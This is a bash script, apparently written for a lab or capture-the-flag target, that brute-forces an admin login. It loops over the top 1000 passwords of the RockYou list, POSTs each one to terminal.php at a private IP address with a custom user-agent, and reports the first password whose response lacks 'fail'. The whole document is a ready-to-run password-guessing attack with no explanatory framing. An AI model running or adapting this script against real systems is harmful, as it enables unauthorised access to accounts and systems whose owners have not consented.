#!/bin/env bash

for pass in $(cat top-1000_rockyou.txt); do
  echo "Trying password: $pass"
  response=$(curl -si -A "secretcomputer" -X POST -d "username=admin&password=$pass" http://10.67.147.80/terminal.php?action=login)
  if ! echo "$response" | grep -qi "fail"; then
    echo "[+] Password found: $pass"
    break
  fi
done
